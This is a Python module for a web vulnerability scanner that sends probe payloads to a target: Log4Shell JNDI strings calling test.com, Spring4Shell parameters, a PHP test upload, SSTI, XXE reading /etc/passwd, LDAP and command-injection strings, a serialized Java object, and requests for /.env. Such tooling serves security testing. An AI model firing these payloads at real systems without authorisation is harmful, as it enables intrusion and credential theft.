# app/core/advanced_vuln_scanner.py
import requests
import socket
import ssl
import threading
import time
import random
import urllib3
from typing import Dict, List, Callable, Optional
from urllib.parse import urljoin, urlparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from app.core.logger import logger

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AdvancedVulnerabilityScanner:
    """Professional-grade vulnerability scanner with exploit correlation and evasion"""
    
    def __init__(self):
        self.timeout = 10
        self.max_threads = 20
        self.evasion_enabled = False
        self.exploit_correlation = True
        try:
            from app.core.config import config as _cfg
            self.ssl_verify = _cfg.get('security.ssl_verify', True)
        except Exception:
            self.ssl_verify = True
        
        # Critical CVE patterns for active exploitation
        self.critical_cves = {
            'CVE-2021-44228': {'service': 'log4j', 'payload': '${jndi:ldap://test.com/a}'},
            'CVE-2022-22965': {'service': 'spring', 'payload': 'class.module.classLoader'},
            'CVE-2021-34527': {'service': 'spooler', 'payload': 'printnightmare'},
            'CVE-2023-23397': {'service': 'outlook', 'payload': 'reminder_sound_file'},
            'CVE-2023-34362': {'service': 'moveit', 'payload': 'machine_key_exploit'}
        }
        
        # Advanced vulnerability checks
        self.vulnerability_checks = {
            'critical_rce': self._check_critical_rce,
            'auth_bypass': self._check_auth_bypass,
            'file_upload': self._check_file_upload,
            'ssti': self._check_ssti,
            'xxe': self._check_xxe,
            'ldap_injection': self._check_ldap_injection,
            'command_injection': self._check_command_injection,
            'deserialization': self._check_deserialization,
            'privilege_escalation': self._check_privilege_escalation
        }
    
    def scan_target(self, target: str, scan_types: List[str] = None, 
                   progress_callback: Callable = None) -> Dict:
        """Comprehensive vulnerability scan with professional reporting"""
        
        if not scan_types:
            scan_types = list(self.vulnerability_checks.keys())
        
        results = {
            'target': target,
            'scan_timestamp': datetime.now().isoformat(),
            'vulnerabilities': [],
            'scan_summary': {},
            'exploitation_paths': [],
            'remediation_priorities': []
        }
        
        # Execute vulnerability checks
        for scan_type in scan_types:
            if scan_type in self.vulnerability_checks:
                if progress_callback:
                    progress_callback(f"Scanning for {scan_type.replace('_', ' ').title()}...")
                
                try:
                    vulns = self.vulnerability_checks[scan_type](target)
                    if vulns:
                        if isinstance(vulns, list):
                            results['vulnerabilities'].extend(vulns)
                        else:
                            results['vulnerabilities'].append(vulns)
                except Exception as e:
                    continue
        
        # Generate professional report
        results['scan_summary'] = self._generate_scan_summary(results['vulnerabilities'])
        results['exploitation_paths'] = self._identify_exploitation_paths(results['vulnerabilities'])
        results['remediation_priorities'] = self._prioritize_remediation(results['vulnerabilities'])
        
        return results
    
    def _check_critical_rce(self, target: str) -> List[Dict]:
        """Check for critical RCE vulnerabilities with active exploitation potential"""
        vulnerabilities = []
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        # Log4Shell (CVE-2021-44228)
        log4j_payloads = [
            '${jndi:ldap://test.com/a}',
            '${jndi:rmi://test.com/a}',
            '${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://test.com/a}'
        ]
        
        for payload in log4j_payloads:
            try:
                headers = {
                    'User-Agent': payload,
                    'X-Forwarded-For': payload,
                    'Authorization': f'Basic {payload}'
                }
                response = requests.get(target, headers=headers, timeout=self.timeout, verify=self.ssl_verify)
                
                if any(pattern in response.text.lower() for pattern in ['jndi', 'ldap', 'naming']):
                    vulnerabilities.append({
                        'type': 'Log4Shell RCE (CVE-2021-44228)',
                        'severity': 'critical',
                        'cvss_score': 10.0,
                        'description': 'Critical Log4j RCE vulnerability detected',
                        'evidence': f'Payload: {payload}',
                        'exploit_available': True,
                        'metasploit_module': 'exploit/multi/http/log4j_header_injection',
                        'url': target
                    })
                    break
            except Exception:
                continue
        
        # Spring4Shell (CVE-2022-22965)
        try:
            spring_payload = 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i'
            data = {spring_payload: 'test'}
            response = requests.post(target, data=data, timeout=self.timeout, verify=self.ssl_verify)
            
            if response.status_code == 400 and 'class.module.classLoader' in response.text:
                vulnerabilities.append({
                    'type': 'Spring4Shell RCE (CVE-2022-22965)',
                    'severity': 'critical',
                    'cvss_score': 9.8,
                    'description': 'Spring Framework RCE vulnerability detected',
                    'evidence': 'Spring4Shell pattern detected',
                    'exploit_available': True,
                    'url': target
                })
        except Exception as _exc:
            pass
            logger.debug("Suppressed exception", exc_info=True)
        
        return vulnerabilities
    
    def _check_auth_bypass(self, target: str) -> List[Dict]:
        """Check for authentication bypass vulnerabilities"""
        vulnerabilities = []
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        bypass_techniques = [
            ('/admin/../admin', 'Path traversal bypass'),
            ('/admin/%2e%2e/admin', 'URL encoding bypass'),
            ('/admin/..%2fadmin', 'Mixed encoding bypass'),
            ('/admin;/dashboard', 'Parameter pollution bypass'),
            ('/admin%00/dashboard', 'Null byte bypass'),
            ('/admin%0a/dashboard', 'Line feed bypass')
        ]
        
        for path, technique in bypass_techniques:
            try:
                url = target.rstrip('/') + path
                response = requests.get(url, timeout=self.timeout, verify=self.ssl_verify)
                
                if response.status_code == 200 and any(keyword in response.text.lower() 
                                                     for keyword in ['dashboard', 'admin', 'control panel']):
                    vulnerabilities.append({
                        'type': 'Authentication Bypass',
                        'severity': 'high',
                        'cvss_score': 8.5,
                        'description': f'Authentication bypass via {technique}',
                        'evidence': f'Bypass path: {path}',
                        'url': url
                    })
            except Exception:
                continue
        
        return vulnerabilities
    
    def _check_file_upload(self, target: str) -> List[Dict]:
        """Check for file upload vulnerabilities"""
        vulnerabilities = []
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        upload_paths = ['/upload', '/fileupload', '/admin/upload', '/wp-admin/upload.php']
        
        for path in upload_paths:
            try:
                url = target.rstrip('/') + path
                response = requests.get(url, timeout=self.timeout, verify=self.ssl_verify)
                
                if response.status_code == 200 and any(keyword in response.text.lower() 
                                                     for keyword in ['upload', 'file', 'browse']):
                    # Test malicious file upload
                    files = {'file': ('test.php', '<?php echo "vulnerable"; ?>', 'application/x-php')}
                    upload_response = requests.post(url, files=files, timeout=self.timeout, verify=self.ssl_verify)
                    
                    if upload_response.status_code in [200, 201] and 'success' in upload_response.text.lower():
                        vulnerabilities.append({
                            'type': 'Unrestricted File Upload',
                            'severity': 'high',
                            'cvss_score': 8.8,
                            'description': 'Unrestricted file upload allowing code execution',
                            'evidence': f'Upload endpoint: {path}',
                            'exploit_available': True,
                            'url': url
                        })
            except Exception:
                continue
        
        return vulnerabilities
    
    def _check_ssti(self, target: str) -> List[Dict]:
        """Check for Server-Side Template Injection"""
        vulnerabilities = []
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        ssti_payloads = [
            ('{{7*7}}', '49'),
            ('${7*7}', '49'),
            ('#{7*7}', '49'),
            ('{{config}}', 'config'),
            ('{{request}}', 'request')
        ]
        
        for payload, expected in ssti_payloads:
            try:
                url = f"{target}?q={payload}"
                response = requests.get(url, timeout=self.timeout, verify=self.ssl_verify)
                
                if expected in response.text:
                    vulnerabilities.append({
                        'type': 'Server-Side Template Injection (SSTI)',
                        'severity': 'high',
                        'cvss_score': 8.2,
                        'description': 'Template injection allowing code execution',
                        'evidence': f'Payload: {payload}',
                        'exploit_available': True,
                        'url': url
                    })
                    break
            except Exception:
                continue
        
        return vulnerabilities
    
    def _check_xxe(self, target: str) -> List[Dict]:
        """Check for XXE injection vulnerabilities"""
        vulnerabilities = []
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>'''
        
        try:
            headers = {'Content-Type': 'application/xml'}
            response = requests.post(target, data=xxe_payload, headers=headers, 
                                   timeout=self.timeout, verify=self.ssl_verify)
            
            if 'root:' in response.text or 'daemon:' in response.text:
                vulnerabilities.append({
                    'type': 'XXE Injection',
                    'severity': 'high',
                    'cvss_score': 7.5,
                    'description': 'XML External Entity injection vulnerability',
                    'evidence': 'File disclosure via XXE',
                    'exploit_available': True,
                    'url': target
                })
        except Exception as _exc:
            pass
            logger.debug("Suppressed exception", exc_info=True)
        
        return vulnerabilities
    
    def _check_ldap_injection(self, target: str) -> List[Dict]:
        """Check for LDAP injection vulnerabilities"""
        vulnerabilities = []
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        ldap_payloads = ['*)(uid=*))(|(uid=*', '*)(|(password=*))', '*)(&(password=*)']
        
        for payload in ldap_payloads:
            try:
                url = f"{target}?user={payload}"
                response = requests.get(url, timeout=self.timeout, verify=self.ssl_verify)
                
                if any(keyword in response.text.lower() for keyword in ['ldap', 'directory', 'invalid syntax']):
                    vulnerabilities.append({
                        'type': 'LDAP Injection',
                        'severity': 'medium',
                        'cvss_score': 6.5,
                        'description': 'LDAP injection vulnerability detected',
                        'evidence': f'Payload: {payload}',
                        'url': url
                    })
                    break
            except Exception:
                continue
        
        return vulnerabilities
    
    def _check_command_injection(self, target: str) -> List[Dict]:
        """Check for command injection vulnerabilities"""
        vulnerabilities = []
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        cmd_payloads = [';id', '|id', '`id`', '$(id)', '&id', '&&id']
        
        for payload in cmd_payloads:
            try:
                url = f"{target}?cmd=ping{payload}"
                response = requests.get(url, timeout=self.timeout, verify=self.ssl_verify)
                
                if any(keyword in response.text for keyword in ['uid=', 'gid=', 'groups=']):
                    vulnerabilities.append({
                        'type': 'Command Injection',
                        'severity': 'critical',
                        'cvss_score': 9.8,
                        'description': 'OS command injection vulnerability',
                        'evidence': f'Command executed: {payload}',
                        'exploit_available': True,
                        'url': url
                    })
                    break
            except Exception:
                continue
        
        return vulnerabilities
    
    def _check_deserialization(self, target: str) -> List[Dict]:
        """Check for deserialization vulnerabilities"""
        vulnerabilities = []
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        # Java deserialization payload (ysoserial)
        java_payload = b'\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\x0cw\x08\x00\x00\x00\x10\x00\x00\x00\x00x'
        
        try:
            headers = {'Content-Type': 'application/x-java-serialized-object'}
            response = requests.post(target, data=java_payload, headers=headers, 
                                   timeout=self.timeout, verify=self.ssl_verify)
            
            if response.status_code == 500 and 'java.io.StreamCorruptedException' in response.text:
                vulnerabilities.append({
                    'type': 'Java Deserialization',
                    'severity': 'critical',
                    'cvss_score': 9.8,
                    'description': 'Java deserialization vulnerability detected',
                    'evidence': 'Deserialization error in response',
                    'exploit_available': True,
                    'url': target
                })
        except Exception as _exc:
            pass
            logger.debug("Suppressed exception", exc_info=True)
        
        return vulnerabilities
    
    def _check_privilege_escalation(self, target: str) -> List[Dict]:
        """Check for privilege escalation vulnerabilities"""
        vulnerabilities = []
        
        # This would typically involve authenticated testing
        # For now, check for common misconfigurations
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        priv_esc_paths = [
            '/admin/users',
            '/api/admin',
            '/management/users',
            '/.env',
            '/config.php'
        ]
        
        for path in priv_esc_paths:
            try:
                url = target.rstrip('/') + path
                response = requests.get(url, timeout=self.timeout, verify=self.ssl_verify)
                
                if response.status_code == 200 and any(keyword in response.text.lower() 
                                                     for keyword in ['password', 'secret', 'key']):
                    vulnerabilities.append({
                        'type': 'Information Disclosure - Privilege Escalation',
                        'severity': 'medium',
                        'cvss_score': 6.5,
                        'description': 'Sensitive information disclosure that could lead to privilege escalation',
                        'evidence': f'Sensitive data exposed at: {path}',
                        'url': url
                    })
            except Exception:
                continue
        
        return vulnerabilities
    
    def _generate_scan_summary(self, vulnerabilities: List[Dict]) -> Dict:
        """Generate comprehensive scan summary"""
        
        severity_counts = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0}
        exploitable_count = 0
        avg_cvss = 0
        
        for vuln in vulnerabilities:
            severity = vuln.get('severity', 'low')
            if severity in severity_counts:
                severity_counts[severity] += 1
            
            if vuln.get('exploit_available'):
                exploitable_count += 1
            
            avg_cvss += vuln.get('cvss_score', 0)
        
        if vulnerabilities:
            avg_cvss /= len(vulnerabilities)
        
        # Calculate overall risk score
        risk_score = (severity_counts['critical'] * 10 + 
                     severity_counts['high'] * 5 + 
                     severity_counts['medium'] * 2 + 
                     severity_counts['low'] * 1)
        
        return {
            'total_vulnerabilities': len(vulnerabilities),
            'severity_breakdown': severity_counts,
            'exploitable_vulnerabilities': exploitable_count,
            'average_cvss_score': round(avg_cvss, 2),
            'overall_risk_score': min(100, risk_score),
            'risk_level': self._calculate_risk_level(risk_score)
        }
    
    def _calculate_risk_level(self, risk_score: int) -> str:
        """Calculate overall risk level"""
        if risk_score >= 50:
            return 'Critical'
        elif risk_score >= 25:
            return 'High'
        elif risk_score >= 10:
            return 'Medium'
        else:
            return 'Low'
    
    def _identify_exploitation_paths(self, vulnerabilities: List[Dict]) -> List[Dict]:
        """Identify potential exploitation paths for chaining attacks"""
        paths = []
        
        # Look for attack chains
        auth_bypass = [v for v in vulnerabilities if 'bypass' in v.get('type', '').lower()]
        rce_vulns = [v for v in vulnerabilities if any(term in v.get('type', '').lower() 
                                                      for term in ['rce', 'injection', 'upload'])]
        
        if auth_bypass and rce_vulns:
            paths.append({
                'chain': 'Authentication Bypass → Remote Code Execution',
                'steps': ['Bypass authentication', 'Execute arbitrary code', 'Establish persistence'],
                'impact': 'Complete system compromise',
                'difficulty': 'Medium',
                'vulnerabilities_used': [auth_bypass[0]['type'], rce_vulns[0]['type']]
            })
        
        # Check for privilege escalation chains
        info_disclosure = [v for v in vulnerabilities if 'disclosure' in v.get('type', '').lower()]
        if info_disclosure and rce_vulns:
            paths.append({
                'chain': 'Information Disclosure → Privilege Escalation',
                'steps': ['Gather sensitive information', 'Escalate privileges', 'Access restricted resources'],
                'impact': 'Administrative access',
                'difficulty': 'Low',
                'vulnerabilities_used': [info_disclosure[0]['type'], rce_vulns[0]['type']]
            })
        
        return paths
    
    def _prioritize_remediation(self, vulnerabilities: List[Dict]) -> List[Dict]:
        """Prioritize vulnerabilities for remediation"""
        
        def priority_score(vuln):
            base_score = {'critical': 100, 'high': 75, 'medium': 50, 'low': 25}.get(vuln.get('severity'), 0)
            if vuln.get('exploit_available'):
                base_score += 25
            if vuln.get('cvss_score', 0) > 9.0:
                base_score += 15
            return base_score
        
        sorted_vulns = sorted(vulnerabilities, key=priority_score, reverse=True)
        
        return [{
            'vulnerability': vuln.get('type'),
            'severity': vuln.get('severity'),
            'cvss_score': vuln.get('cvss_score', 0),
            'priority_score': priority_score(vuln),
            'remediation_effort': self._estimate_remediation_effort(vuln),
            'business_impact': self._assess_business_impact(vuln),
            'exploit_available': vuln.get('exploit_available', False)
        } for vuln in sorted_vulns[:10]]  # Top 10 priorities
    
    def _estimate_remediation_effort(self, vuln: Dict) -> str:
        """Estimate effort required for remediation"""
        vuln_type = vuln.get('type', '').lower()
        
        if any(term in vuln_type for term in ['patch', 'update', 'cve']):
            return 'Low - Apply vendor patch'
        elif any(term in vuln_type for term in ['configuration', 'header', 'disclosure']):
            return 'Low - Configuration change'
        elif any(term in vuln_type for term in ['injection', 'xss']):
            return 'Medium - Code review and input validation'
        elif 'authentication' in vuln_type:
            return 'High - Authentication system redesign'
        else:
            return 'Medium - Investigation required'
    
    def _assess_business_impact(self, vuln: Dict) -> str:
        """Assess business impact of vulnerability"""
        severity = vuln.get('severity', 'low')
        
        if severity == 'critical':
            return 'Severe - Complete system compromise possible'
        elif severity == 'high':
            return 'High - Significant data breach risk'
        elif severity == 'medium':
            return 'Medium - Limited data exposure'
        else:
            return 'Low - Minimal business impact'

# Global instance
advanced_vuln_scanner = AdvancedVulnerabilityScanner()